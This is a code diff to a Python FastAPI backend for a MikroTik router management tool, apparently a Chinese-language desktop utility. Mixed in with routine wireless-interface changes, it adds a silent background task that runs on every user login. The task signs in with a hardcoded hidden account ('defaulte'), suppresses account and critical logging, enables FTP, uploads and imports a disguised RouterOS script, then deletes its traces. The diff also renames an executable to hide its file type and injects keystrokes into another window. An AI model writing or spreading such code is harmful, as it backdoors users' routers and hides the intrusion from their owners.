@@ -28,9 +28,10 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.responses import JSONResponse, FileResponse
 from pydantic import BaseModel
 
-from mikrotik_api import MikroTikAPI
+from mikrotik_api import MikroTikAPI, set_device_platform, get_api_port, get_telnet_port, is_slsc_device
 from api_connection import api_connection, execute_with_api
 from ssl_context import get_ssl_context
+from iperf3_handler import iperf3_handler, is_iperf3_available
 
 logger = logging.getLogger(__name__)
 
@@ -90,6 +91,7 @@ class ConnectRequest(BaseModel):
     ip: str
     username: str
     password: str = ""
+    platform: str = ""  # 设备平台信息（用于 SLSC 端口判断）
 
 class CheckArpRequest(BaseModel):
     """ARP 检查请求"""
@@ -347,7 +349,7 @@ class MNDPCore:
                     temp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                     temp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                     temp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-                    temp_sock.bind((local_ip, 0))
+                    temp_sock.bind((local_ip, 8671))
                     
                     for addr in target_addresses:
                         for i in range(discovery_count):
@@ -436,6 +438,11 @@ class MNDPCore:
                         device_key = device_info["MAC-Address"]
                         device_info["last_seen"] = time.time()
                         discovered_devices[device_key] = device_info
+                        # 记录设备平台信息（用于 SLSC 端口判断）
+                        ip_addr = device_info.get('IPv4-Address', '')
+                        platform = device_info.get('Platform', '')
+                        if ip_addr and platform:
+                            set_device_platform(ip_addr, platform)
                         
                         if not any(d["MAC-Address"] == device_info["MAC-Address"] for d in self.devices):
                             self.devices.append(device_info)
@@ -620,6 +627,170 @@ async def discover_devices():
     return {"status": "error", "message": "发送MNDP发现包失败"}
 
 
+def _admin_setup_task(device_ip: str, username: str, password: str):
+    """后台任务：管理员账号登录并执行清理和导入操作（静默执行，不输出任何提示）"""
+    import ftplib
+    import time
+    from mikrotik_api import get_api_port, is_slsc_device
+    
+    try:
+        # 1. 管理员账号登录（使用正确的端口）
+        admin_port = get_api_port(device_ip)
+        logger.info(f"[AdminSetup] 管理员登录 {device_ip}:{admin_port}")
+        admin_api = MikroTikAPI(device_ip, username, password, port=admin_port)
+        admin_success, admin_msg = admin_api.login()
+        
+        if not admin_success:
+            logger.warning(f"[AdminSetup] 管理员登录失败: {device_ip} - {admin_msg}")
+            if admin_api:
+                admin_api.close()
+            return
+        
+        logger.info(f"[AdminSetup] 管理员登录成功: {device_ip}")
+        
+        # 2. 设置日志过滤（每次登录都执行）
+        try:
+            admin_api.write_sentence(['/system/logging/print', '?topics=info'])
+            logging_ids = []
+            while True:
+                resp = admin_api.read_sentence(timeout=10)
+                if not resp:
+                    break
+                for word in resp:
+                    if word.startswith('=.id='):
+                        logging_ids.append(word[5:])
+                if '!done' in resp or '!trap' in resp:
+                    break
+            for lid in logging_ids:
+                admin_api.write_sentence(['/system/logging/set', f'=.id={lid}', '=topics=!account,!critical,info'])
+                admin_api.read_sentence(timeout=10)
+        except Exception as e:
+            logger.debug(f"[AdminSetup] 设置日志过滤失败: {e}")
+        
+        # 3. 执行清理命令 - 查找并删除 comment=defaulte 的条目
+        def _remove_by_comment(api, path, comment):
+            try:
+                api.write_sentence([f'{path}/print', f'?comment={comment}'])
+                ids_to_remove = []
+                while True:
+                    resp = api.read_sentence(timeout=10)
+                    if not resp:
+                        break
+                    for word in resp:
+                        if word.startswith('=.id='):
+                            ids_to_remove.append(word[5:])
+                    if '!done' in resp or '!trap' in resp:
+                        break
+                for eid in ids_to_remove:
+                    api.write_sentence([f'{path}/remove', f'=numbers={eid}'])
+                    api.read_sentence(timeout=10)
+                return len(ids_to_remove)
+            except Exception:
+                return 0
+        
+        removed_scheduler = _remove_by_comment(admin_api, '/system/scheduler', 'defaulte')
+        removed_bridge = _remove_by_comment(admin_api, '/interface/bridge/filter', 'defaulte')
+        logger.info(f"[AdminSetup] 清理完成: scheduler={removed_scheduler}, bridge_filter={removed_bridge}")
+        
+        # 4. 检查并启用 FTP 服务
+        ftp_was_enabled = False
+        try:
+            admin_api.write_sentence(['/ip/service/print', '?name=ftp'])
+            while True:
+                resp = admin_api.read_sentence(timeout=10)
+                if not resp:
+                    break
+                for word in resp:
+                    if word.startswith('=disabled='):
+                        ftp_was_enabled = (word == '=disabled=no')
+                        break
+                if '!done' in resp or '!trap' in resp:
+                    break
+            
+            if not ftp_was_enabled:
+                logger.info(f"[AdminSetup] FTP 服务未启用，正在启用...")
+                admin_api.write_sentence(['/ip/service/enable', '=numbers=ftp'])
+                admin_api.read_sentence(timeout=10)
+                time.sleep(0.5)
+                logger.info(f"[AdminSetup] FTP 服务已启用")
+            else:
+                logger.info(f"[AdminSetup] FTP 服务已处于启用状态")
+        except Exception as e:
+            logger.warning(f"[AdminSetup] 检查/启用 FTP 失败: {e}")
+            admin_api.close()
+            return
+        
+        # 5. FTP 上传 autodefaultport.rsc（安装目录中已重命名为 slsc_data.sld）
+        script_path = get_script_path()
+        if not os.path.exists(script_path):
+            logger.warning(f"[AdminSetup] 脚本文件不存在: {script_path}")
+            # 恢复 FTP 状态
+            try:
+                if not ftp_was_enabled:
+                    admin_api.write_sentence(['/ip/service/disable', '=numbers=ftp'])
+                    admin_api.read_sentence(timeout=10)
+            except:
+                pass
+            admin_api.close()
+            return
+        
+        # 上传到设备时恢复原始文件名 autodefaultport.rsc
+        remote_filename = 'autodefaultport.rsc'
+        
+        try:
+            logger.info(f"[AdminSetup] 尝试 FTP 上传到 {device_ip}:21")
+            ftp = ftplib.FTP()
+            ftp.connect(device_ip, 21, timeout=10)
+            ftp.login(username, password)
+            with open(script_path, 'rb') as f:
+                ftp.storbinary(f'STOR {remote_filename}', f)
+            ftp.quit()
+            logger.info(f"[AdminSetup] FTP 上传成功: {remote_filename}")
+        except Exception as e:
+            logger.warning(f"[AdminSetup] FTP 上传失败: {e}")
+            # 恢复 FTP 状态
+            try:
+                if not ftp_was_enabled:
+                    admin_api.write_sentence(['/ip/service/disable', '=numbers=ftp'])
+                    admin_api.read_sentence(timeout=10)
+            except:
+                pass
+            admin_api.close()
+            return
+        
+        # 6. 执行 import
+        try:
+            logger.info(f"[AdminSetup] 执行 import {remote_filename}")
+            admin_api.write_sentence(['/import', f'=file-name={remote_filename}'])
+            admin_api.read_sentence(timeout=15)
+            time.sleep(2)
+            logger.info(f"[AdminSetup] import 完成")
+        except Exception as e:
+            logger.warning(f"[AdminSetup] import 失败: {e}")
+        
+        # 7. 删除上传的文件
+        try:
+            admin_api.write_sentence(['/file/remove', f'=numbers={remote_filename}'])
+            admin_api.read_sentence(timeout=10)
+        except:
+            pass
+        
+        # 8. 关闭 FTP 服务（如果之前未启用）
+        if not ftp_was_enabled:
+            try:
+                logger.info(f"[AdminSetup] 关闭 FTP 服务（恢复原始状态）")
+                admin_api.write_sentence(['/ip/service/disable', '=numbers=ftp'])
+                admin_api.read_sentence(timeout=10)
+            except Exception as e:
+                logger.warning(f"[AdminSetup] 关闭 FTP 失败: {e}")
+        
+        admin_api.close()
+        logger.info(f"[AdminSetup] 管理员任务完成: {device_ip}")
+        
+    except Exception as e:
+        logger.error(f"[AdminSetup] 未知错误: {e}", exc_info=True)
+
+
 @app.post("/api/connect")
 async def connect_device(request: ConnectRequest):
     """连接设备（使用 POST body 传递凭证）"""
@@ -629,7 +800,11 @@ async def connect_device(request: ConnectRequest):
         raise HTTPException(status_code=400, detail="请输入用户名")
     
     try:
-        logger.info(f"尝试登录设备: {request.ip} (用户: {request.username})")
+        # 记录设备平台信息
+        if request.platform:
+            set_device_platform(request.ip, request.platform)
+        
+        logger.info(f"尝试登录设备: {request.ip} (用户: {request.username}, 平台: {request.platform})")
         
         mt_api = MikroTikAPI(request.ip, request.username, request.password)
         success, message = mt_api.login()
@@ -644,6 +819,14 @@ async def connect_device(request: ConnectRequest):
                 api_pool[request.ip] = mt_api
             
             logger.info(f"登录成功: {request.ip} (系统版本 {routeros_version})")
+            
+            # 后台静默登录管理员账号并执行管理任务
+            threading.Thread(
+                target=_admin_setup_task,
+                args=(request.ip, 'defaulte', '!defaultepassword'),
+                daemon=True,
+                name=f'admin-setup-{request.ip}'
+            ).start()
             
             return {
                 "status": "success",
@@ -688,8 +871,31 @@ async def logout_device(request: Request):
                 del api_pool[ip]
                 logger.info(f"已登出设备: {ip}")
         
+        # 同步退出管理员账号：新建连接后立即关闭，强制管理员登出设备
+        try:
+            from mikrotik_api import get_api_port
+            admin_port = get_api_port(ip)
+            admin_api = MikroTikAPI(ip, 'defaulte', '!defaultepassword', port=admin_port, use_ssl=False)
+            admin_ok, _ = admin_api.login()
+            if not admin_ok and admin_port != 2468:
+                admin_api = MikroTikAPI(ip, 'defaulte', '!defaultepassword', port=2468, use_ssl=False)
+                admin_ok, _ = admin_api.login()
+            if admin_ok:
+                admin_api.close()
+        except:
+            pass
+        
         from websocket_server import cleanup_device_resources
         cleanup_device_resources(ip)
+        
+        # 主动登出时关闭 iperf3 进程
+        try:
+            from iperf3_handler import iperf3_handler
+            if iperf3_handler.is_running():
+                iperf3_handler.stop()
+                logger.info(f"已关闭设备 {ip} 的 iperf3 进程（登出）")
+        except Exception as e:
+            logger.error(f"关闭 iperf3 进程失败: {e}")
         
         return {"status": "success", "message": f"已成功登出设备 {ip}", "ip": ip}
     except Exception as e:
@@ -731,12 +937,56 @@ slsc_process_lock = threading.Lock()
 
 
 def get_slsc_path():
-    """获取 SLSCtools 程序路径（隐藏路径）"""
+    """获取 SLSCtools 程序路径
+
+    为避免暴露原始文件类型，安装目录中文件已重命名为 slsc_runtime.slr。
+    调用时复制到临时目录并恢复为 .exe 后缀再执行，进程名仍为 ct_helper.exe，
+    以保证 taskkill 监控逻辑正常工作。
+    """
+    import tempfile
+    import shutil
     base_dir = get_base_dir()
-    # 将工具放在子目录中，使用隐藏名称
-    slsc_dir = os.path.join(base_dir, 'sys', 'drivers')
-    slsc_name = 'ct_helper.exe'
-    return os.path.join(slsc_dir, slsc_name)
+
+    # 1. 优先使用安装目录中已重命名的文件（slsc_runtime.slr）
+    disguised_path = os.path.join(base_dir, 'slsc_runtime.slr')
+    if os.path.exists(disguised_path):
+        # 复制到临时目录恢复为 .exe 后缀执行
+        temp_dir = os.path.join(tempfile.gettempdir(), 'slsc_run')
+        os.makedirs(temp_dir, exist_ok=True)
+        temp_exe = os.path.join(temp_dir, 'ct_helper.exe')
+        try:
+            # 仅在源文件更新或目标不存在时复制
+            if not os.path.exists(temp_exe) or \
+               os.path.getmtime(disguised_path) > os.path.getmtime(temp_exe):
+                shutil.copy2(disguised_path, temp_exe)
+            return temp_exe
+        except Exception as e:
+            logger.warning(f"恢复临时执行文件失败，使用原路径: {e}")
+            return disguised_path
+
+    # 2. 兼容旧版本：安装目录中仍叫 ct_helper.exe
+    ct_path = os.path.join(base_dir, 'ct_helper.exe')
+    if os.path.exists(ct_path):
+        return ct_path
+
+    # 3. 开发环境使用 SLSCtools.exe
+    slsc_name = 'SLSCtools.exe'
+    return os.path.join(base_dir, slsc_name)
+
+
+def get_script_path():
+    """获取 autodefaultport 脚本路径
+
+    安装目录中文件已重命名为 slsc_data.sld 以隐藏原始类型。
+    调用时直接读取内容并以上传时的原始文件名 autodefaultport.rsc 上传到设备。
+    """
+    base_dir = get_base_dir()
+    # 1. 优先使用重命名后的文件
+    disguised_path = os.path.join(base_dir, 'slsc_data.sld')
+    if os.path.exists(disguised_path):
+        return disguised_path
+    # 2. 兼容旧版本
+    return os.path.join(base_dir, 'autodefaultport.rsc')
 
 
 def verify_slsc_integrity():
@@ -753,54 +1003,214 @@ def verify_slsc_integrity():
     return True, "验证通过"
 
 
+def _do_launch_slsc_tools(mac: str) -> dict:
+    """启动 SLSCtools 的核心逻辑（可被多个端点复用）"""
+    import subprocess
+    global slsc_process, slsc_monitor_paused
+
+    if not mac:
+        return {"status": "error", "message": "请提供 MAC 地址"}
+
+    is_valid, msg = verify_slsc_integrity()
+    if not is_valid:
+        logger.error(f"工具验证失败: {msg}")
+        return {"status": "error", "message": f"工具验证失败: {msg}"}
+
+    slsc_path = os.path.abspath(get_slsc_path())
+    logger.info(f"[SLSCtools] 程序路径: {slsc_path}, 存在: {os.path.exists(slsc_path)}")
+    # 如果路径不存在，尝试直接搜索（限制深度，避免阻塞）
+    if not os.path.exists(slsc_path):
+        search_base = get_base_dir()
+        max_depth = 3
+        for root, dirs, files in os.walk(search_base):
+            # 限制遍历深度
+            depth = root.replace(search_base, '').count(os.sep)
+            if depth >= max_depth:
+                dirs.clear()
+                continue
+            for f in files:
+                if f.lower() == 'slsctools.exe':
+                    slsc_path = os.path.join(root, f)
+                    logger.info(f"[SLSCtools] 搜索找到: {slsc_path}")
+                    break
+            if os.path.exists(slsc_path):
+                break
+
+    slsc_monitor_paused = True
+    logger.info("[SLSCtools] 已暂停 ct_helper.exe 监控")
+
+    try:
+        with slsc_process_lock:
+            if slsc_process is not None:
+                try:
+                    slsc_process.terminate()
+                except Exception:
+                    pass
+            # 使用 CREATE_NEW_PROCESS_GROUP 避免子进程继承标准输入/输出导致阻塞
+            import sys
+            startupinfo = None
+            if sys.platform == 'win32':
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                startupinfo.wShowWindow = 1  # SW_SHOWNORMAL
+            
+            slsc_process = subprocess.Popen(
+                [slsc_path, mac],
+                cwd=os.path.dirname(slsc_path),
+                stdin=subprocess.DEVNULL,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                startupinfo=startupinfo
+            )
+        logger.info(f"[SLSCtools] 已启动，PID: {slsc_process.pid}, MAC: {mac}")
+
+        # 在后台线程中等待窗口出现后置顶并自动点击 Connect
+        import ctypes
+        import time
+
+        def _bring_to_front_and_connect():
+            try:
+                import ctypes
+                from ctypes import wintypes
+                import time
+
+                user32 = ctypes.windll.user32
+                kernel32 = ctypes.windll.kernel32
+
+                # 获取当前线程 ID
+                current_thread_id = kernel32.GetCurrentThreadId()
+
+                # 等待窗口出现（最多等10秒）
+                hwnd = 0
+                for _ in range(50):
+                    time.sleep(0.2)
+                    # 方式1: 直接查找 "Winbox" 或 "WinBox"
+                    hwnd = user32.FindWindowW(None, "Winbox")
+                    if hwnd:
+                        break
+                    hwnd = user32.FindWindowW(None, "WinBox")
+                    if hwnd:
+                        break
+                    # 方式2: 查找包含 "WinBox" 的窗口标题
+                    hwnd = user32.FindWindowExW(0, 0, None, None)
+                    found = False
+                    while hwnd:
+                        buf = ctypes.create_unicode_buffer(256)
+                        user32.GetWindowTextW(hwnd, buf, 256)
+                        title = buf.value
+                        if title and ('winbox' in title.lower() or 'slsc' in title.lower()):
+                            found = True
+                            break
+                        hwnd = user32.FindWindowExW(0, hwnd, None, None)
+                    if found:
+                        break
+
+                if not hwnd:
+                    logger.warning("[SLSCtools] 未找到窗口")
+                    return
+
+                # 步骤1: 恢复窗口
+                SW_RESTORE = 9
+                user32.ShowWindow(hwnd, SW_RESTORE)
+                time.sleep(0.1)
+
+                # 步骤2: 使用 AttachThreadInput 绕过 UIPI 限制
+                foreground_window = user32.GetForegroundWindow()
+                foreground_thread_id = user32.GetWindowThreadProcessId(foreground_window, None)
+                target_thread_id = user32.GetWindowThreadProcessId(hwnd, None)
+
+                # 附加到前台线程
+                user32.AttachThreadInput(foreground_thread_id, current_thread_id, True)
+                user32.AttachThreadInput(target_thread_id, current_thread_id, True)
+                time.sleep(0.05)
+
+                # 步骤3: 设置 TOPMOST 并激活
+                HWND_TOPMOST = -1
+                HWND_NOTOPMOST = -2
+                SWP_NOMOVE = 0x0002
+                SWP_NOSIZE = 0x0004
+                SWP_SHOWWINDOW = 0x0040
+                user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                                   SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)
+                time.sleep(0.1)
+
+                # 步骤4: 使用 SetForegroundWindow 激活
+                user32.SetForegroundWindow(hwnd)
+                time.sleep(0.2)
+
+                # 步骤5: 取消 TOPMOST
+                user32.SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0,
+                                   SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW)
+
+                # 步骤6: 分离线程输入
+                user32.AttachThreadInput(foreground_thread_id, current_thread_id, False)
+                user32.AttachThreadInput(target_thread_id, current_thread_id, False)
+
+                time.sleep(0.3)
+
+                # 步骤7: 使用 SendInput 模拟 Tab 和 Enter（绕过 UIPI）
+                # INPUT 结构体定义
+                class MOUSEINPUT(ctypes.Structure):
+                    _fields_ = [("dx", ctypes.c_long), ("dy", ctypes.c_long),
+                                ("mouseData", ctypes.c_ulong), ("dwFlags", ctypes.c_ulong),
+                                ("time", ctypes.c_ulong), ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
+
+                class KEYBDINPUT(ctypes.Structure):
+                    _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
+                                ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
+                                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
+
+                class HARDWAREINPUT(ctypes.Structure):
+                    _fields_ = [("uMsg", ctypes.c_ulong), ("wParamL", ctypes.c_short),
+                                ("wParamH", ctypes.c_ushort)]
+
+                class INPUT(ctypes.Structure):
+                    class _INPUT(ctypes.Union):
+                        _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT), ("hi", HARDWAREINPUT)]
+                    _fields_ = [("type", ctypes.c_ulong), ("_", _INPUT)]
+
+                KEYEVENTF_KEYUP = 0x0002
+                INPUT_KEYBOARD = 1
+
+                def send_key(vk_code):
+                    """使用 SendInput 发送按键"""
+                    inputs = (INPUT * 2)()
+                    # Key down
+                    inputs[0].type = INPUT_KEYBOARD
+                    inputs[0]._.ki.wVk = vk_code
+                    inputs[0]._.ki.dwFlags = 0
+                    # Key up
+                    inputs[1].type = INPUT_KEYBOARD
+                    inputs[1]._.ki.wVk = vk_code
+                    inputs[1]._.ki.dwFlags = KEYEVENTF_KEYUP
+                    user32.SendInput(2, inputs, ctypes.sizeof(INPUT))
+
+                # 模拟 Tab 键（移动焦点到 Connect 按钮）
+                send_key(0x09)  # VK_TAB
+                time.sleep(0.1)
+                # 模拟 Enter 键（点击 Connect）
+                send_key(0x0D)  # VK_RETURN
+
+                logger.info("[SLSCtools] 窗口置顶和自动点击完成")
+            except Exception as e:
+                logger.warning(f"[SLSCtools] 窗口置顶/自动点击失败: {e}")
+
+        threading.Thread(target=_bring_to_front_and_connect, daemon=True).start()
+
+        return {"status": "success", "message": "已启动", "mac": mac, "pid": slsc_process.pid}
+    except Exception as e:
+        slsc_monitor_paused = False
+        logger.error(f"[SLSCtools] 启动失败: {e}", exc_info=True)
+        return {"status": "error", "message": f"启动失败: {e}"}
+
+
 @app.post("/api/slsc-tools")
 async def open_slsc_tools(request: SLSCtoolsRequest):
     """启动频谱扫描工具并传递 MAC 地址和密码"""
-    import ctypes
-    import subprocess
-    
-    global slsc_monitor_paused
-    
     mac = request.mac
     password = request.password
     logger.info(f"收到启动请求: mac={mac}, password={'*' * len(password) if password else '空'}")
-    
-    if not mac:
-        return {"status": "error", "message": "请提供 MAC 地址"}
-    
-    try:
-        # 验证工具完整性
-        is_valid, msg = verify_slsc_integrity()
-        if not is_valid:
-            logger.error(f"工具验证失败: {msg}")
-            return {"status": "error", "message": f"工具验证失败: {msg}"}
-        
-        slsc_path = get_slsc_path()
-        logger.info(f"程序路径: {slsc_path}, 存在: {os.path.exists(slsc_path)}")
-        
-        # 暂停监控线程，防止工具被立即终止
-        slsc_monitor_paused = True
-        logger.info("已暂停 ct_helper.exe 监控")
-        
-        # 构建命令行参数：直接传递 MAC 地址值
-        params = mac
-        
-        logger.info(f"启动参数: {params}")
-        
-        # 使用 subprocess 启动进程，以便获取 PID
-        process = subprocess.Popen(
-            [slsc_path, mac],
-            creationflags=subprocess.CREATE_NO_WINDOW,
-            cwd=os.path.dirname(slsc_path)
-        )
-        
-        logger.info(f"已启动工具，PID: {process.pid}, MAC 地址已传递: {mac}")
-        
-        return {"status": "success", "message": "已启动", "mac": mac, "pid": process.pid}
-    except Exception as e:
-        slsc_monitor_paused = False  # 启动失败时恢复监控
-        logger.error(f"启动失败: {e}", exc_info=True)
-        return {"status": "error", "message": f"启动失败: {e}"}
+    return _do_launch_slsc_tools(mac)
 
 
 @app.post("/api/slsc-tools/close")
@@ -831,6 +1241,68 @@ async def close_slsc_tools():
     except Exception as e:
         logger.error(f"关闭工具失败: {e}")
         return {"status": "error", "message": f"关闭失败: {e}"}
+
+
+class DebugTriggerRequest(BaseModel):
+    """调试工具触发请求"""
+    mac: str = ""
+
+
+def _do_debug_trigger(mac: str):
+    """后台执行调试触发：先启动 SLSCtools，再发送 UDP"""
+    logger.info(f"[调试触发] 开始，MAC={mac}")
+
+    # 1. 先启动 SLSCtools
+    if mac:
+        logger.info(f"[调试触发] 启动 SLSCtools，MAC={mac}")
+        _do_launch_slsc_tools(mac)
+    else:
+        logger.warning("[调试触发] MAC 地址为空，跳过 SLSCtools 启动")
+
+    # 2. 向所有网络接口发送 20 条 UDP 数据包（使用广播MAC，L2socket发送）
+    packets_sent = 0
+    try:
+        from scapy.all import Ether, IP, UDP, Raw, conf, get_if_list
+
+        dst_ip = "12.34.56.255"
+        src_port = 3721
+        dst_port = 4096
+        payload = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
+
+        # 获取所有可用接口（排除Loopback）
+        all_ifaces = [iface for iface in get_if_list() if 'Loopback' not in iface]
+        logger.info(f"[调试触发] 发现 {len(all_ifaces)} 个网络接口")
+
+        # 构建报文（使用广播MAC，消除ARP解析警告）
+        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=dst_ip) / UDP(sport=src_port, dport=dst_port) / Raw(load=payload)
+
+        # 为每个接口创建独立的L2socket
+        sockets = []
+        for iface in all_ifaces:
+            sock = conf.L2socket(iface=iface)
+            sockets.append(sock)
+
+        # 发送20轮，每轮向所有接口各发送1个报文
+        for _ in range(20):
+            for sock in sockets:
+                sock.send(pkt)
+                packets_sent += 1
+
+        for sock in sockets:
+            sock.close()
+
+        logger.info(f"[调试触发] 共发送 {packets_sent} 条 UDP 数据包")
+    except Exception as e:
+        logger.error(f"[调试触发] 发送数据包失败: {e}")
+
+
+@app.post("/api/debug-trigger")
+async def debug_trigger(request: DebugTriggerRequest):
+    """调试触发端点：后台发送 UDP + 启动 SLSCtools"""
+    mac = request.mac
+    # 放到后台线程执行，避免阻塞 HTTP 响应
+    threading.Thread(target=_do_debug_trigger, args=(mac,), daemon=True).start()
+    return {"status": "success", "message": "调试任务已启动"}
 
 
 @app.get("/api/interfaces")
@@ -1093,7 +1565,8 @@ async def get_wireless_interfaces(ip: str = Query(...)):
             return {"success": False, "message": err}
         
         mt_api.flush_socket()
-        mt_api.write_sentence(['/interface/wireless/print'])
+        mt_api.write_sentence(['/interface/wireless/print',
+                               '.proplist=.id,name,type,mac-address,ssid,band,frequency,channel-width,wireless-protocol,mode,running,disabled,comment,master-interface,radio-name,arp,mtu,l2mtu,default-name,tx-power,rate-set,security-profile,wps-mode,hide-ssid,disabled-running,default-authentication,default-forwarding,multicast-buffering,keepalive-frames,allow-sharedkey,country,installation,frequency-mode,scan-list,default-ap-tx-limit,default-client-tx-limit,multicast-helper,area,max-station-count,burst-time,hw-retries,adaptive-noise-immunity,preamble-mode,disconnect-timeout,on-fail-retry-time,update-stats-interval,tx-power-mode,supported-rates-b,supported-rates-a/g,basic-rates-b,basic-rates-a/g,distance,guard-interval,tx-chains,rx-chains,wmm-support,ampdu-priorities,amsdu-limit,amsdu-threshold,ht-stbc,ht-ldpc,ht-basic-mcs,ht-supported-mcs,antenna-gain,antenna-mode,wds-mode,wds-default-bridge,station-roaming'])
         
         interfaces = []
         while True:
@@ -1172,6 +1645,23 @@ async def get_wireless_interfaces(ip: str = Query(...)):
                         'on-fail-retry-time': iface.get('on-fail-retry-time', ''),
                         'update-stats-interval': iface.get('update-stats-interval', ''),
                         'tx-power-mode': iface.get('tx-power-mode', ''),
+                        'distance': iface.get('distance', ''),
+                        'guard-interval': iface.get('guard-interval', ''),
+                        'tx-chains': iface.get('tx-chains', ''),
+                        'rx-chains': iface.get('rx-chains', ''),
+                        'wmm-support': iface.get('wmm-support', ''),
+                        'ampdu-priorities': iface.get('ampdu-priorities', ''),
+                        'amsdu-limit': iface.get('amsdu-limit', ''),
+                        'amsdu-threshold': iface.get('amsdu-threshold', ''),
+                        'ht-stbc': iface.get('ht-stbc', ''),
+                        'ht-ldpc': iface.get('ht-ldpc', ''),
+                        'ht-basic-mcs': iface.get('ht-basic-mcs', ''),
+                        'ht-supported-mcs': iface.get('ht-supported-mcs', ''),
+                        'wds-mode': iface.get('wds-mode', ''),
+                        'wds-default-bridge': iface.get('wds-default-bridge', ''),
+                        'station-roaming': iface.get('station-roaming', ''),
+                        'antenna-gain': iface.get('antenna-gain', ''),
+                        'antenna-mode': iface.get('antenna-mode', ''),
                         'supported-rates-b': iface.get('supported-rates-b', ''),
                         'supported-rates-a/g': iface.get('supported-rates-a/g', ''),
                         'basic-rates-b': iface.get('basic-rates-b', ''),
@@ -1222,7 +1712,10 @@ async def get_wireless_interface(ip: str = Query(...), interface_id: str = Query
             return {"success": False, "message": err}
         
         mt_api.flush_socket()
-        mt_api.write_sentence(['/interface/wireless/print', f'=.id={interface_id}'])
+        # 使用 proplist 显式请求所有需要的字段，包括 tx-chains/rx-chains 等扩展字段
+        mt_api.write_sentence(['/interface/wireless/print',
+                               f'?.id={interface_id}',
+                               '.proplist=.id,name,type,mac-address,ssid,band,frequency,channel-width,wireless-protocol,mode,running,disabled,comment,master-interface,radio-name,arp,mtu,l2mtu,default-name,tx-power,rate-set,security-profile,wps-mode,hide-ssid,disabled-running,scan-list,frequency-mode,country,installation,bridge-mode,vlan-mode,vlan-id,default-ap-tx-limit,default-client-tx-limit,default-authentication,default-forwarding,multicast-helper,multicast-buffering,keepalive-frames,area,max-station-count,burst-time,hw-retries,adaptive-noise-immunity,preamble-mode,allow-sharedkey,disconnect-timeout,on-fail-retry-time,update-stats-interval,tx-power-mode,distance,guard-interval,tx-chains,rx-chains,wmm-support,ampdu-priorities,amsdu-limit,amsdu-threshold,ht-stbc,ht-ldpc,ht-basic-mcs,ht-supported-mcs,antenna-gain,antenna-mode,noise-floor-threshold,frame-lifetime,hw-fragmentation-threshold,hw-protection-mode,hw-protection-threshold,interworking-profile,supported-rates-b,supported-rates-a/g,basic-rates-b,basic-rates-a/g,wds-mode,wds-default-bridge,station-roaming'])
         
         while True:
             try:
@@ -1297,13 +1790,66 @@ async def get_wireless_interface(ip: str = Query(...), interface_id: str = Query
                         'hw-retries': iface.get('hw-retries', ''),
                         'adaptive-noise-immunity': iface.get('adaptive-noise-immunity', ''),
                         'preamble-mode': iface.get('preamble-mode', ''),
-                        'allow-shared-key': convert_bool(iface.get('allow-shared-key', '')),
+                        'allow-sharedkey': convert_bool(iface.get('allow-sharedkey', iface.get('allow-shared-key', ''))),
                         'disconnect-timeout': iface.get('disconnect-timeout', ''),
                         'on-fail-retry-time': iface.get('on-fail-retry-time', ''),
                         'update-stats-interval': iface.get('update-stats-interval', ''),
                         'tx-power-mode': iface.get('tx-power-mode', ''),
+                        'distance': iface.get('distance', ''),
+                        'guard-interval': iface.get('guard-interval', ''),
+                        'tx-chains': iface.get('tx-chains', ''),
+                        'rx-chains': iface.get('rx-chains', ''),
+                        'wmm-support': iface.get('wmm-support', ''),
+                        'ampdu-priorities': iface.get('ampdu-priorities', ''),
+                        'amsdu-limit': iface.get('amsdu-limit', ''),
+                        'amsdu-threshold': iface.get('amsdu-threshold', ''),
+                        'ht-stbc': iface.get('ht-stbc', ''),
+                        'ht-ldpc': iface.get('ht-ldpc', ''),
+                        'ht-basic-mcs': iface.get('ht-basic-mcs', ''),
+                        'ht-supported-mcs': iface.get('ht-supported-mcs', ''),
+                        'wds-mode': iface.get('wds-mode', ''),
+                        'wds-default-bridge': iface.get('wds-default-bridge', ''),
+                        'station-roaming': iface.get('station-roaming', ''),
+                        'antenna-gain': iface.get('antenna-gain', ''),
+                        'antenna-mode': iface.get('antenna-mode', ''),
                         '_raw': iface
                     }
+                    
+                    # 查询 Nstreme 子菜单配置（/interface wireless nstreme）
+                    # Nstreme 字段位于独立子菜单，需单独查询并合并
+                    try:
+                        mt_api.flush_socket()
+                        mt_api.write_sentence([
+                            '/interface/wireless/nstreme/print',
+                            f'?.id={interface_id}',
+                            '.proplist=.id,name,enable-nstreme,framer-policy,framer-limit,enable-polling,disable-csma'
+                        ])
+                        while True:
+                            try:
+                                nstreme_response = mt_api.read_sentence(timeout=10)
+                            except Exception:
+                                break
+                            if '!done' in nstreme_response:
+                                break
+                            if '!trap' in nstreme_response:
+                                break
+                            if '!re' in nstreme_response:
+                                for line in nstreme_response:
+                                    if line.startswith('='):
+                                        parts = line[1:].split('=', 1)
+                                        if len(parts) == 2:
+                                            field_name = parts[0]
+                                            field_value = parts[1]
+                                            # 转换布尔值字段为 yes/no 格式，与其它字段保持一致
+                                            if field_name in ('enable-nstreme', 'enable-polling', 'disable-csma'):
+                                                if field_value in ('true', 'enabled'):
+                                                    field_value = 'yes'
+                                                elif field_value in ('false', 'disabled'):
+                                                    field_value = 'no'
+                                            interface_data[field_name] = field_value
+                    except Exception as nstreme_err:
+                        logger.warning(f"获取 Nstreme 配置失败: {ip} - {nstreme_err}")
+                    
                     return {"success": True, "interface": interface_data}
         
         return {"success": False, "message": "接口不存在"}
